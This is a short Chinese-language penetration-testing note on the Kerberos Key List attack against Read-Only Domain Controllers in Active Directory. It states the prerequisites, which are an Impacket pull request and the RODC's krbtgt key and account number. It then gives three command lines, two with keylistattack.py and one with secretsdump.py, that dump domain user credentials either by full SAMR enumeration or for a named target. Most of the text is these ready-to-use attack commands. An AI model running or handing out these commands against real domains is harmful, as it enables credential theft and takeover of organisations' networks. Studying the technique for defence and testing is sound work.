	如果用户包含在Allowed RODC Password Replication中，则他们的凭据将存储在服务器中，并且 RODC 的msDS-RevealedList属性将填充用户名。
	要求：
	Impacket PR #1210 - Kerberos 密钥列表攻击（https://github.com/SecureAuthCorp/impacket/pull/1210）
	RODC 的krbtgt凭据 (-rodcKey)
	RODC的krbtgt账号ID（-rodcNo）
	keylistattack.py 使用 SAMR 用户不过滤枚举（-full 标志）
	>keylistattack.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -full
	keylistattack.py 定义目标用户名（-t 标志）
	>keylistattack.py -kdc sever.domain.local -t user -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX LIST
	secretsdump.py 使用 Kerberos 密钥列表攻击选项 (-use-keylist)
	>secretsdump.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -use-keylist